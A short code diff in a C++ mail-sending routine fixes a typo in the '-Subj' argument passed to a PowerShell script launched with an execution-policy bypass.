@@ -113,7 +113,7 @@ namespace Mail {
 		if (!ok)
 			return -2;
 
-		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
+		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
 			+ StringReplace(subject, "\"", "\\\"")
 			+ "\" -Body \""
 			+ StringReplace(body, "\"", "\\\"")
